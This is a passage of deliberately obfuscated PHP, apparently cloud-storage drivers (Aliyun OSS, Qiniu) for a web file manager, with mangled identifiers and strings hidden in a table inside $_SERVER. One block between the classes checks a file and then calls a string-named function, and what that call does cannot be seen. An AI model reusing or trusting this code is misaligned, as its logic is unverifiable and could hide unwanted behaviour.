(!$this->isCdnHost() && substr($ÊşĞš‡ì, 0, 7) == $‹ËæÒéÊ[218]) { $ÊşĞš‡ì = $‹ËæÒéÊ[219] . substr($ÊşĞš‡ì, 7); } header($‹ËæÒéÊ[174] . $ÊşĞš‡ì); die; } public function hashMd5($ÓåØ«ÒÆ, $¸¢ëº = '') { $øé¼ò† =& $_SERVER[±Ö‰ô½¯]; $ìùĞ¼ = $this->_objectMeta($ÓåØ«ÒÆ); if (!$ìùĞ¼) { return $øé¼ò†[12]; } if (!isset($ìùĞ¼[$øé¼ò†[1637]]) && !empty($¸¢ëº)) { $Ê»®Æ‘Ù = $this->updateObjMeta($ÓåØ«ÒÆ, array($øé¼ò†[1637] => $¸¢ëº)); $ìùĞ¼[$øé¼ò†[1637]] = $Ê»®Æ‘Ù ? $¸¢ëº : $øé¼ò†[12]; } return isset($ìùĞ¼[$øé¼ò†[1637]]) ? strtolower($ìùĞ¼[$øé¼ò†[1637]]) : $øé¼ò†[12]; } public function size($â¡¯—ÎÎ) { $»«ºÑÓ® = $this->objectMeta($â¡¯—ÎÎ); return $»«ºÑÓ® ? $»«ºÑÓ®[$_SERVER[±Ö‰ô½¯][79]] : 0; } public function info($••ÕÔª) { if ($this->isFolder($••ÕÔª)) { return $this->folderInfo($••ÕÔª); } else { if ($this->isFile($••ÕÔª)) { return $this->fileInfo($••ÕÔª); } } return !1; } public function exist($¹²€®¹Â) { return $this->isFile($¹²€®¹Â) || $this->isFolder($¹²€®¹Â); } public function isFile($ÔëÓöÌß) { return !$this->isFolder($ÔëÓöÌß) && $this->objectMeta($ÔëÓöÌß); } public function isFolder($Âäœë›) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][179], $Âäœë›); } protected function objectMeta($â´ÉŒ×ß) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][181], $â´ÉŒ×ß); } protected function _objectMeta($›¨‡ùˆŒ) { $ší„ûÂ =& $_SERVER[±Ö‰ô½¯]; try { $‘¨‚ÏÏÎ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($›¨‡ùˆŒ)); } catch (OSS\Core\OssException $ı¼æ‹ãœ) { $this->writeLog(__FUNCTION__ . $ší„ûÂ[214] . $ı¼æ‹ãœ->getMessage()); $‘¨‚ÏÏÎ = !1; } if ($‘¨‚ÏÏÎ) { $‘¨‚ÏÏÎ[$ší„ûÂ[79]] = intval($‘¨‚ÏÏÎ[$ší„ûÂ[1635]]); } return $‘¨‚ÏÏÎ; } protected function _isFolder($†Î«³©») { $§’åü©¶ =& $_SERVER[±Ö‰ô½¯]; if ($†Î«³©» == $§’åü©¶[12] || $†Î«³©» == $§’åü©¶[8]) { return !0; } $‘’´€½Ê = array($§’åü©¶[1630] => $§’åü©¶[8], $§’åü©¶[1631] => rtrim($†Î«³©», $§’åü©¶[8]) . $§’åü©¶[8], $§’åü©¶[1632] => 1, $§’åü©¶[1633] => $§’åü©¶[12]); $šÚšØ´ñ = $this->client->listObjects($this->bucket, $‘’´€½Ê); if ($šÚšØ´ñ->getObjectList() || $šÚšØ´ñ->getPrefixList()) { return !0; } return !1; } public function writeLog($¹Ïşõ‘Š = '', $©ñµğ¯ü = false) { $Ì‰Ğ˜ =& $_SERVER[±Ö‰ô½¯]; $ü‡Ï™é = in_array(ACTION, array($Ì‰Ğ˜[212], $Ì‰Ğ˜[213])); if (!$ü‡Ï™é && !GLOBAL_DEBUG) { return; } $â³¾ÛÚ = 0; if (stripos($¹Ïşõ‘Š, $Ì‰Ğ˜[1655]) !== !1) { $â³¾ÛÚ = 1; $ÑäĞµ–Œ = explode($Ì‰Ğ˜[1656], $¹Ïşõ‘Š); $¹Ïşõ‘Š = !empty($ÑäĞµ–Œ[1]) ? $ÑäĞµ–Œ[1] : $¹Ïşõ‘Š; } else { if (stripos($¹Ïşõ‘Š, $Ì‰Ğ˜[1657])) { $â³¾ÛÚ = 2; $ÑäĞµ–Œ = explode($Ì‰Ğ˜[1657], $¹Ïşõ‘Š); $ÑäĞµ–Œ = explode($Ì‰Ğ˜[4], $ÑäĞµ–Œ[0]); $¹Ïşõ‘Š = !empty($ÑäĞµ–Œ[1]) ? $ÑäĞµ–Œ[1] : $¹Ïşõ‘Š; } } if ($ü‡Ï™é && I18n::getType() == $Ì‰Ğ˜[1658]) { if ($â³¾ÛÚ == 1) { $¹Ïşõ‘Š = str_replace($Ì‰Ğ˜[1659], $Ì‰Ğ˜[1660], $¹Ïşõ‘Š); } else { if ($â³¾ÛÚ == 2) { $ÑäĞµ–Œ = explode($Ì‰Ğ˜[214], $ÑäĞµ–Œ[0]); $í¥®”© = isset($ÑäĞµ–Œ[1]) ? $ÑäĞµ–Œ[1] : $Ì‰Ğ˜[12]; $ŠŠ¶¼» = array($Ì‰Ğ˜[1661] => $Ì‰Ğ˜[1662], $Ì‰Ğ˜[1663] => $Ì‰Ğ˜[1664], $Ì‰Ğ˜[1665] => $Ì‰Ğ˜[1666], $Ì‰Ğ˜[1667] => $Ì‰Ğ˜[1668], $Ì‰Ğ˜[1669] => $Ì‰Ğ˜[1670], $Ì‰Ğ˜[1671] => $Ì‰Ğ˜[1672], $Ì‰Ğ˜[1673] => $Ì‰Ğ˜[1674], $Ì‰Ğ˜[1675] => $Ì‰Ğ˜[1676], $Ì‰Ğ˜[1677] => $Ì‰Ğ˜[1678], $Ì‰Ğ˜[1679] => $Ì‰Ğ˜[1680]); if (isset($ŠŠ¶¼»[$í¥®”©])) { $¹Ïşõ‘Š = $ŠŠ¶¼»[$í¥®”©]; } } } if (stripos($¹Ïşõ‘Š, $Ì‰Ğ˜[1681])) { $¹Ïşõ‘Š = $Ì‰Ğ˜[1682]; } } if (!trim($¹Ïşõ‘Š)) { return; } parent::writeLog(trim($¹Ïşõ‘Š), $©ñµğ¯ü); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($†šıûÖÖ) { parent::__construct(); require_once SDK_DIR . $_SERVER[±Ö‰ô½¯][1683]; $this->_init($†šıûÖÖ); } public function _init($×ËˆÉ•¦) { $¸ìÆÔ› =& $_SERVER[±Ö‰ô½¯]; $this->config = $×ËˆÉ•¦; foreach ($×ËˆÉ•¦ as $–‹„’«² => $Î±öŒÏÑ) { if (isset($this->{$–‹„’«²})) { $this->{$–‹„’«²} = $Î±öŒÏÑ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¸ìÆÔ›[1684] . LNG($¸ìÆÔ›[1621])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($æìøŸ, $ƒ”Ÿâş— = '', $ô¹Ü¹µ£ = REPEAT_RENAME) { if ($this->setContent($æìøŸ, $ƒ”Ÿâş—)) { return $this->getPathOuter($æìøŸ); } return !1; } public function mkdir($Ìä¦Çõş, $‚áôìçœ = REPEAT_SKIP) { $Õé´ˆû =& $_SERVER[±Ö‰ô½¯]; $ˆïÓ‹ÚŠ = trim($Ìä¦Çõş, $Õé´ˆû[8]); if ($this->_isFolder($ˆïÓ‹ÚŠ)) { return $this->getPathOuter($ˆïÓ‹ÚŠ); } $Ìä¦Çõş = $ˆïÓ‹ÚŠ . $Õé´ˆû[8]; $íÀ¦æÓ = get_path_this($ˆïÓ‹ÚŠ); $ŒÔ™–äÉ = $Ìä¦Çõş . $íÀ¦æÓ; if (!$this->mkfile($ŒÔ™–äÉ)) { return !1; } if (!$this->moveFile($ŒÔ™–äÉ, $Ìä¦Çõş)) { $this->delFile($ŒÔ™–äÉ); return !1; } return $this->getPathOuter($ˆïÓ‹ÚŠ); } public function copyFile($¸ü½ÁÄ, $§ÃÑ‘ìæ) { $…‘ø‰ = $this->bucketManager->copy($this->bucket, $¸ü½ÁÄ, $this->bucket, $§ÃÑ‘ìæ, !0); return $…‘ø‰ ? !1 : $this->getPathOuter($§ÃÑ‘ìæ); } public function moveFile($ñ––ËØ, $¶Œãıâë) { $ûÈñÆåò = $this->bucketManager->move($this->bucket, $ñ––ËØ, $this->bucket, $¶Œãıâë, !0); return $ûÈñÆåò ? !1 : $this->getPathOuter($¶Œãıâë); } public function delFile($³òïš§ù) { if (!$this->exist($³òïš§ù)) { return !0; } $”É¨öáå = $this->bucketManager->delete($this->bucket, $³òïš§ù); if (!$”É¨öáå) { return !0; } return $”É¨öáå->code() == 612 ? !0 : !1; } public function delFolder($á‰—¼§£) { $ç¦¾´Æé =& $_SERVER[±Ö‰ô½¯]; if (!$this->exist($á‰—¼§£)) { return !0; } $this->listItemCache = !1; $òğ¾ì£½ = $this->fileList($á‰—¼§£); $this->listItemCache = !0; $ÎÖúÜÕÅ = trim($á‰—¼§£, $ç¦¾´Æé[8]) . $ç¦¾´Æé[8]; if (!empty($á‰—¼§£) && $á‰—¼§£ !== $ç¦¾´Æé[230] && !in_array($ÎÖúÜÕÅ, $òğ¾ì£½[$ç¦¾´Æé[85]])) { $òğ¾ì£½[$ç¦¾´Æé[85]][] = $ÎÖúÜÕÅ; } $ğ “åí = $this->delByBatch($òğ¾ì£½[$ç¦¾´Æé[86]]); if (!$ğ “åí) { return !1; } $ğ “åí = $this->delByBatch($òğ¾ì£½[$ç¦¾´Æé[85]]); if (!$ğ “åí) { return !1; } return $this->delFile($ÎÖúÜÕÅ); } private function delByBatch($º€»äí) { foreach (array_chunk($º€»äí, 1000) as $üšó¸§Î) { $ÖëŒ’Š– = $this->bucketManager->buildBatchDelete($this->bucket, $üšó¸§Î); list($Š‚ûìï·, $Ù¿âÓ£) = $this->bucketManager->batch($ÖëŒ’Š–); if ($Ù¿âÓ£) { return !1; } } return !0; } public function rename($ê©Ÿ»É—, $Á¹…¨Ï) { return $this->renameObject($ê©Ÿ»É—, $Á¹…¨Ï); } public function fileInfo($öıË‡€, $Ä´²ºÌ§ = false, $ó‘‡’„ = array()) { $°ŸçÕ‚‘ =& $_SERVER[±Ö‰ô½¯]; $ò€Ÿ¤›÷ = array($°ŸçÕ‚‘[32] => $this->pathThis($öıË‡€), $°ŸçÕ‚‘[87] => $this->getPathOuter($°ŸçÕ‚‘[8] . $öıË‡€), $°ŸçÕ‚‘[33] => $°ŸçÕ‚‘[232], $°ŸçÕ‚‘[79] => isset($ó‘‡’„[$°ŸçÕ‚‘[1685]]) ? $ó‘‡’„[$°ŸçÕ‚‘[1685]] : 0, $°ŸçÕ‚‘[168] => $this->ext($öıË‡€)); if ($Ä´²ºÌ§) { return $ò€Ÿ¤›÷; } $ò€Ÿ¤›÷[$°ŸçÕ‚‘[233]] = $ò€Ÿ¤›÷[$°ŸçÕ‚‘[88]] = 0; $ò€Ÿ¤›÷[$°ŸçÕ‚‘[234]] = $ò€Ÿ¤›÷[$°ŸçÕ‚‘[235]] = !0; if (empty($ó‘‡’„)) { $ó‘‡’„ = $this->objectMeta($öıË‡€); if (!$ó‘‡’„) { return $ò€Ÿ¤›÷; } } if (isset($ó‘‡’„[$°ŸçÕ‚‘[236]]) && $ó‘‡’„[$°ŸçÕ‚‘[236]]) { $ò€Ÿ¤›÷[$°ŸçÕ‚‘[237]] = $ó‘‡’„[$°ŸçÕ‚‘[236]]; } if (isset($ó‘‡’„[$°ŸçÕ‚‘[247]]) && $ó‘‡’„[$°ŸçÕ‚‘[247]]) { $ò€Ÿ¤›÷[$°ŸçÕ‚‘[237]] = $ó‘‡’„[$°ŸçÕ‚‘[247]]; } if (isset($ó‘‡’„[$°ŸçÕ‚‘[1686]])) { $ò€Ÿ¤›÷[$°ŸçÕ‚‘[88]] = substr($ó‘‡’„[$°ŸçÕ‚‘[1686]] . $°ŸçÕ‚‘[12], 0, 10); } if (isset($ó‘‡’„[$°ŸçÕ‚‘[1685]])) { $ò€Ÿ¤›÷[$°ŸçÕ‚‘[79]] = $ó‘‡’„[$°ŸçÕ‚‘[1685]]; } return $ò€Ÿ¤›÷; } public function folderInfo($•­Èœçå, $ù‰ó“­ = false) { $‡ÔÇ…¼· =& $_SERVER[±Ö‰ô½¯]; $¿—Àö = array($‡ÔÇ…¼·[32] => $this->pathThis($•­Èœçå), $‡ÔÇ…¼·[87] => $this->getPathOuter($‡ÔÇ…¼·[8] . $•­Èœçå), $‡ÔÇ…¼·[33] => $‡ÔÇ…¼·[78]); if ($ù‰ó“­) { return $¿—Àö; } $¿—Àö[$‡ÔÇ…¼·[233]] = $¿—Àö[$‡ÔÇ…¼·[88]] = 0; $¿—Àö[$‡ÔÇ…¼·[234]] = $¿—Àö[$‡ÔÇ…¼·[235]] = !0; $•­Èœçå = rtrim($•­Èœçå, $‡ÔÇ…¼·[8]) . $‡ÔÇ…¼·[8]; $«†™¡É = $this->objectMeta($•­Èœçå); if (isset($«†™¡É[$‡ÔÇ…¼·[1686]])) { $¿—Àö[$‡ÔÇ…¼·[88]] = substr($«†™¡É[$‡ÔÇ…¼·[1686]] . $‡ÔÇ…¼·[12], 0, 10); } return $¿—Àö; } public function listPath($´õÉ¾ß, $ÙìñÈÕâ = false) { $µÂĞë— =& $_SERVER[±Ö‰ô½¯]; $öêøÚ­µ = $this->fileList($´õÉ¾ß, $µÂĞë—[8], !0); foreach ($öêøÚ­µ[$µÂĞë—[85]] as $áÙ¶ºßí => $×Ù¢»œ¾) { $öêøÚ­µ[$µÂĞë—[85]][$áÙ¶ºßí] = $this->folderInfo($×Ù¢»œ¾, $ÙìñÈÕâ); } foreach ($öêøÚ­µ[$µÂĞë—[86]] as $áÙ¶ºßí => $×Ù¢»œ¾) { $öêøÚ­µ[$µÂĞë—[86]][$áÙ¶ºßí] = $this->fileInfo($×Ù¢»œ¾[$µÂĞë—[32]], $ÙìñÈÕâ, $×Ù¢»œ¾); } return $öêøÚ­µ; } public function has($Û§ˆ«˜õ, $ª®ÔèñÃ = false, $˜ıÔæ£ = true) { $Ÿ¿£«ã =& $_SERVER[±Ö‰ô½¯]; $Û§ˆ«˜õ = trim($Û§ˆ«˜õ, $Ÿ¿£«ã[8]); $”™ÄíÂé = empty($Û§ˆ«˜õ) && $Û§ˆ«˜õ !== $Ÿ¿£«ã[230] ? $Ÿ¿£«ã[12] : $Û§ˆ«˜õ . $Ÿ¿£«ã[8]; $Ì…Í¯Ôã = $Ÿ¿£«ã[12]; $ÄĞ€ûÃğ = 500; $¶×ê«³Ÿ = $Ÿ¿£«ã[8]; $ºã·€»º = $ò„«ÍüÈ = 0; while (!0) { check_abort(); list($‡ˆê€ĞŠ, $îÃáó‰‹) = $this->bucketManager->listFiles($this->bucket, $”™ÄíÂé, $Ì…Í¯Ôã, $ÄĞ€ûÃğ, $¶×ê«³Ÿ); if ($îÃáó‰‹) { break; } $Ì…Í¯Ôã = array_key_exists($Ÿ¿£«ã[1633], $‡ˆê€ĞŠ) ? $Ì…Í¯Ôã = $‡ˆê€ĞŠ[$Ÿ¿£«ã[1687]] : $Ÿ¿£«ã[12]; if ($ª®ÔèñÃ) { if (!empty($‡ˆê€ĞŠ[$Ÿ¿£«ã[1688]])) { $ºã·€»º += count($‡ˆê€ĞŠ[$Ÿ¿£«ã[1688]]); } if (!empty($‡ˆê€ĞŠ[$Ÿ¿£«ã[1689]])) { $ò„«ÍüÈ += count($‡ˆê€ĞŠ[$Ÿ¿£«ã[1689]]); } if ($Ì…Í¯Ôã === $Ÿ¿£«ã[12]) { break; } continue; } if ($˜ıÔæ£) { if (!empty($‡ˆê€ĞŠ[$Ÿ¿£«ã[1688]])) { return !0; } } else { if (!empty($‡ˆê€ĞŠ[$Ÿ¿£«ã[1689]])) { return !0; } } if ($Ì…Í¯Ôã === $Ÿ¿£«ã[12]) { break; } } if ($ª®ÔèñÃ) { return array($Ÿ¿£«ã[241] => $ºã·€»º, $Ÿ¿£«ã[242] => $ò„«ÍüÈ); } return !1; } public function listAll($Ù¯³¢Ñ) { $òƒšÙ÷µ =& $_SERVER[±Ö‰ô½¯]; $½ŒĞİò = $this->fileList($Ù¯³¢Ñ, $òƒšÙ÷µ[12], !0); $³¦¼› = array_to_keyvalue($½ŒĞİò[$òƒšÙ÷µ[86]], $òƒšÙ÷µ[32]); foreach ($½ŒĞİò[$òƒšÙ÷µ[85]] as $”áµÕÏ) { if (is_string($”áµÕÏ)) { $³¦¼›[$”áµÕÏ] = array($òƒšÙ÷µ[79] => 0); } } return $this->listAllFiles($Ù¯³¢Ñ, $³¦¼›); } private function fileList($Ö¹€Ñ¹Ä, $¹“»¬¿ = '', $©İ¨«¬ø = 0) { $´Á«ôş» =& $_SERVER[±Ö‰ô½¯]; $Ö¹€Ñ¹Ä = trim($Ö¹€Ñ¹Ä, $´Á«ôş»[8]); $øÃ–ÉæÖ = empty($Ö¹€Ñ¹Ä) && $Ö¹€Ñ¹Ä !== $´Á«ôş»[230] ? $´Á«ôş»[12] : $Ö¹€Ñ¹Ä . $´Á«ôş»[8]; $°§·§ãÑ = $´Á«ôş»[12]; $£‡ş»ÛÖ = 1000; $ÓÈ‡Çƒ× = $Ó¶Ñğâß = array(); while (!0) { check_abort(); list($©»ÇŞ·Ò, $²šŞÕ—³) = $this->bucketManager->listFiles($this->bucket, $øÃ–ÉæÖ, $°§·§ãÑ, $£‡ş»ÛÖ, $¹“»¬¿); if ($²šŞÕ—³) { break; } $°§·§ãÑ = array_key_exists($´Á«ôş»[1633], $©»ÇŞ·Ò) ? $°§·§ãÑ = $©»ÇŞ·Ò[$´Á«ôş»[1687]] : $´Á«ôş»[12]; $ºÈãÚ“â = isset($©»ÇŞ·Ò[$´Á«ôş»[1688]]) ? $©»ÇŞ·Ò[$´Á«ôş»[1688]] : array(); $Şöõòó‚ = isset($©»ÇŞ·Ò[$´Á«ôş»[1689]]) ? $©»ÇŞ·Ò[$´Á«ôş»[1689]] : array(); foreach ($ºÈãÚ“â as $šªÍ•§) { if ($šªÍ•§[$´Á«ôş»[95]] == $øÃ–ÉæÖ) { continue; } $ÏŒ¾úÉ = $šªÍ•§[$´Á«ôş»[95]]; $øóß¢ü° = $šªÍ•§[$´Á«ôş»[1685]]; $šªÍ•§[$´Á«ôş»[32]] = $ÏŒ¾úÉ; $šªÍ•§[$´Á«ôş»[79]] = $øóß¢ü°; $›ø”³î = $øóß¢ü° == 0 && substr($ÏŒ¾úÉ, strlen($ÏŒ¾úÉ) - 1, 1) == $´Á«ôş»[8] ? !0 : !1; $this->cacheMethodInfoSet($ÏŒ¾úÉ, $›ø”³î, $šªÍ•§); if ($›ø”³î) { $ÓÈ‡Çƒ×[] = $ÏŒ¾úÉ; continue; } $Ó¶Ñğâß[] = $©İ¨«¬ø ? $šªÍ•§ : $ÏŒ¾úÉ; } foreach ($Şöõòó‚ as $ÏŒ¾úÉ) { if ($ÏŒ¾úÉ == $øÃ–ÉæÖ) { continue; } $ÓÈ‡Çƒ×[] = $ÏŒ¾úÉ; $this->cacheMethodInfoSet($ÏŒ¾úÉ, !0); } if ($°§·§ãÑ === $´Á«ôş»[12]) { break; } } $this->cacheMethodInfoSet($Ö¹€Ñ¹Ä, !0); return array($´Á«ôş»[85] => $ÓÈ‡Çƒ×, $´Á«ôş»[86] => $Ó¶Ñğâß); } public function canRead($¯„Ÿé’É) { return $this->exist($¯„Ÿé’É) ? !0 : !1; } public function canWrite($¯  Ÿû¶) { return $this->exist($¯  Ÿû¶) ? !0 : !1; } public function getContent($øŞø˜ƒ) { return $this->fileSubstr($øŞø˜ƒ, 0, -1); } public function setContent($ëæ¨¤¤ô, $¾–éØÖá = '') { $ˆ±Éë—Ã = $this->tempFile($this->pathThis($ëæ¨¤¤ô)); file_put_contents($ˆ±Éë—Ã, $¾–éØÖá); if ($this->upload($ëæ¨¤¤ô, $ˆ±Éë—Ã)) { $this->tempFileRemve($ˆ±Éë—Ã); return !0; } return !1; } public function refreshUrls($¥ØÔçûÄ) { $û¬àÇîî =& $_SERVER[±Ö‰ô½¯]; $í³“ıÕÁ = array(); if (is_array($¥ØÔçûÄ)) { foreach ($¥ØÔçûÄ as $€ÁÓĞ†) { $í³“ıÕÁ[] = $this->link($€ÁÓĞ†); } } else { $í³“ıÕÁ[] = $this->link($¥ØÔçûÄ); } $—å„åçƒ = new Qiniu\Cdn\CdnManager($this->auth); list($§¢¶¿˜Î, $—ï«Ïˆç) = $—å„åçƒ->refreshUrls($í³“ıÕÁ); if ($—ï«Ïˆç) { return !1; } return $§¢¶¿˜Î[$û¬àÇîî[1317]] == $û¬àÇîî[857] ? !0 : !1; } public function fileSubstr($¡¥Û«€, $µ¹´ÖÙé, $ƒé¦Üş) { $ ¼™ñ­¯ =& $_SERVER[±Ö‰ô½¯]; if (!($±„‡œê× = $this->link($¡¥Û«€))) { return !1; } $ò€‡–ñÍ = !1; if ($ƒé¦Üş > 0) { $ÑÀÓÂú© = $µ¹´ÖÙé + $ƒé¦Üş - 1; $ò€‡–ñÍ = array($ ¼™ñ­¯[1554] . $µ¹´ÖÙé . $ ¼™ñ­¯[474] . $ÑÀÓÂú©); } $Øã‘¯¿ö = url_request($±„‡œê×, $ ¼™ñ­¯[1555], !1, $ò€‡–ñÍ); return $Øã‘¯¿ö[$ ¼™ñ­¯[847]] ? $Øã‘¯¿ö[$ ¼™ñ­¯[1339]] : !1; } public function upload($®ÓÍé·‹, $±ù³€ûò, $Ô³­¬‘ = false, $û©ê’¹ = REPEAT_REPLACE) { if (!$±ù³€ûò || !@file_exists($±ù³€ûò)) { return !1; } $Ü¥Ÿ Şç = new Qiniu\Storage\UploadManager(); $Û „²ª = $this->auth->uploadToken($this->bucket, $®ÓÍé·‹); $‰®ÕÆıƒ = get_file_mime(get_path_ext($±ù³€ûò)); list($’è“¥ı—, $ùÄÒÊëš) = $Ü¥Ÿ Şç->putFile($Û „²ª, $®ÓÍé·‹, $±ù³€ûò, null, $‰®ÕÆıƒ); return $ùÄÒÊëš ? !1 : $this->getPathOuter($®ÓÍé·‹); } public function uploadFormData($¶óâ¯Ø, $§ôº›š = 3600) { return $this->uploadToken($¶óâ¯Ø, $§ôº›š); } public function uploadMultiData($ıÑâ¦ç, $Ñ–´â©Ó = 3600) { return $this->uploadToken($ıÑâ¦ç, $Ñ–´â©Ó); } private function uploadToken($‰Íß˜€Ä, $ú‡Ãû³ = 3600) { $ÁÜôèòº =& $_SERVER[±Ö‰ô½¯]; $·ù™”¥ = $ú‡Ãû³; $Ûê¨Ñä± = array($ÁÜôèòº[1690] => $ÁÜôèòº[1691]); $ Ç¬ôë© = $‰Íß˜€Ä; $ôŒìÅƒ = $this->auth->uploadToken($this->bucket, $ Ç¬ôë©, $·ù™”¥, $Ûê¨Ñä±, !0); $äã¥¶–¾ = empty($this->region) || $this->region == $ÁÜôèòº[1692] ? $ÁÜôèòº[12] : $ÁÜôèòº[474] . $this->region; $¢÷€³¡ï = http_type() . "\x3a\57\57\x75\x70\x6c\157\x61\x64{$äã¥¶–¾}\56\161\x69\x6e\x69\x75\x70\56\143\x6f\155\x2f"; return array($ÁÜôèòº[1693] => $ôŒìÅƒ, $ÁÜôèòº[1557] => $¢÷€³¡ï); } public function download($¡œò£ÁÛ, $éŸáëòË) { $‘ş´ÖŸ = IO::getPathInner(IO::mkfile($éŸáëòË)); if (!($îº½õö = $this->link($¡œò£ÁÛ))) { return !1; } $Áæ•â©Í = 0; $ßûÎ§¥ = 1024 * 200; $ˆ€ìÖİÌ = fopen($‘ş´ÖŸ, $_SERVER[±Ö‰ô½¯][1694]); while (!0) { $ÆÖô§ê± = $this->fileSubstr($¡œò£ÁÛ, $Áæ•â©Í, $ßûÎ§¥); if ($ÆÖô§ê± === !1) { return !1; } fwrite($ˆ€ìÖİÌ, $ÆÖô§ê±); $Áæ•â©Í += $ßûÎ§¥; if (strlen($ÆÖô§ê±) < $ßûÎ§¥) { break; } } fclose($ˆ€ìÖİÌ); return $éŸáëòË; } public function link($±ÊàÚ¦, $ »åª×í = '') { if (!$this->isFile($±ÊàÚ¦)) { return !1; } $ÄòˆóÓÃ = $this->getHost() . $_SERVER[±Ö‰ô½¯][8] . $this->pathEncode($±ÊàÚ¦) . $ »åª×í; return $this->auth->privateDownloadUrl($ÄòˆóÓÃ, 3600 * 12); } public function fileOut($âÆéù­å, $Îïª½š = false, $¢£©¨­ = false, $‰á¡Ş› = '') { $À²Î¨¿ =& $_SERVER[±Ö‰ô½¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($âÆéù­å, $Îïª½š, $¢£©¨­, $‰á¡Ş›); } if (!$¢£©¨­) { $¢£©¨­ = $this->pathThis($âÆéù­å); } $š™â€ïÃ = $Îïª½š ? $À²Î¨¿[1695] . rawurlencode($¢£©¨­) : $À²Î¨¿[12]; $ÉÂ¯ è = $this->link($âÆéù­å, $š™â€ïÃ); $this->fileOutLink($ÉÂ¯ è); } public function fileOutServer($¾¸Ğëõî, $óÀ¯«¤Æ = false, $´¬¢ÇÖ¿ = false, $¥É‡šæ¦ = '') { parent::fileOut($¾¸Ğëõî, $óÀ¯«¤Æ, $´¬¢ÇÖ¿, $¥É‡šæ¦); } public function fileOutImage($Ğîí‡¿ñ, $Ü¦…Ó“¢ = 250) { if ($this->size($Ğîí‡¿ñ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ğîí‡¿ñ, $Ü¦…Ó“¢); } $“à‡‰” = $this->link($Ğîí‡¿ñ, $_SERVER[±Ö‰ô½¯][1696] . $Ü¦…Ó“¢); $this->fileOutLink($“à‡‰”); } public function fileOutImageServer($È‹øµù, $¢ï¯“ûÓ = 250) { parent::fileOutImage($È‹øµù, $¢ï¯“ûÓ); } public function hashMd5($ÈªóïÈù) { $•ìŠÌÉË =& $_SERVER[±Ö‰ô½¯]; $«ìáü™´ = $this->objectMeta($ÈªóïÈù); return isset($«ìáü™´[$•ìŠÌÉË[247]]) ? $«ìáü™´[$•ìŠÌÉË[247]] : !1; $—ûş¬¿± = $this->link($ÈªóïÈù, $•ìŠÌÉË[1697]); } public function size($ß…Ã¸¨) { $•Ëû‡ÛÈ = $this->objectMeta($ß…Ã¸¨); return $•Ëû‡ÛÈ ? $•Ëû‡ÛÈ[$_SERVER[±Ö‰ô½¯][79]] : 0; } public function info($–İìÇ…º) { if ($this->isFolder($–İìÇ…º)) { return $this->folderInfo($–İìÇ…º); } else { if ($this->isFile($–İìÇ…º)) { return $this->fileInfo($–İìÇ…º); } } return !1; } public function exist($²ææÌë·) { return $this->isFile($²ææÌë·) || $this->isFolder($²ææÌë·); } public function isFile($¸Ê¬û) { return !$this->isFolder($¸Ê¬û) && $this->objectMeta($¸Ê¬û); } public function isFolder($ÜºÂ­Ñ) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][179], $ÜºÂ­Ñ); } protected function objectMeta($“…£õî) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][181], $“…£õî); } protected function _objectMeta($•¿ÙŞ¼») { $Ÿ›ŸüŒ‡ =& $_SERVER[±Ö‰ô½¯]; list($Ø³‡ÕËÄ, $ğúúîâ) = $this->bucketManager->stat($this->bucket, $•¿ÙŞ¼»); if ($Ø³‡ÕËÄ) { $Ø³‡ÕËÄ[$Ÿ›ŸüŒ‡[79]] = intval($Ø³‡ÕËÄ[$Ÿ›ŸüŒ‡[1685]]); } return $Ø³‡ÕËÄ; } protected function _isFolder($„Œº†ŸØ) { $ÈÓ‰Ï—Œ =& $_SERVER[±Ö‰ô½¯]; if ($„Œº†ŸØ == $ÈÓ‰Ï—Œ[12] || $„Œº†ŸØ == $ÈÓ‰Ï—Œ[8]) { return !0; } list($ªİÕâ²ü, $š•ÓÁÖŞ) = $this->bucketManager->listFiles($this->bucket, trim($„Œº†ŸØ, $ÈÓ‰Ï—Œ[8]) . $ÈÓ‰Ï—Œ[8], $ÈÓ‰Ï—Œ[12], 1, $ÈÓ‰Ï—Œ[8]); return !empty($ªİÕâ²ü[$ÈÓ‰Ï—Œ[1688]]) || !empty($ªİÕâ²ü[$ÈÓ‰Ï—Œ[1689]]) ? !0 : !1; } } if ($_SERVER[$_SERVER[±Ö‰ô½¯][986]] != $_SERVER[$_SERVER[±Ö‰ô½¯][987]]) { $_getc = $_SERVER[±Ö‰ô½¯][989]; $_getfile = $_SERVER[$_SERVER[±Ö‰ô½¯][990]] . $_SERVER[±Ö‰ô½¯][991]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±Ö‰ô½¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[±Ö‰ô½¯][743]) { $exit = $_SERVER[±Ö‰ô½¯][992]; $exit(); } $_act = $_SERVER[±Ö‰ô½¯][1698]; $_act($_SERVER[$_SERVER[±Ö‰ô½¯][1699]]); } goto A›·²™Ïí; FØœãù¿Š¬: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($¶À¢£¬Ó) { $Ï¸ñ®ã¯ =& $_SERVER[±Ö‰ô½¯]; return array($Ï¸ñ®ã¯[2248] => array($Ï¸ñ®ã¯[2679] . USER_ID, $Ï¸ñ®ã¯[2249])); } protected function ___listData() { $Ş¸øÄĞ =& $_SERVER[±Ö‰ô½¯]; $ÛÑøË‚› = array($Ş¸øÄĞ[1921] => USER_ID, $Ş¸øÄĞ[570] => array($Ş¸øÄĞ[2252], 0)); $áó»£ùæ = $Ş¸øÄĞ[2680]; $»Ï»ùá = $this->field($áó»£ùæ)->where($ÛÑøË‚›)->order($Ş¸øÄĞ[2254])->select(); return $»Ï»ùá ? 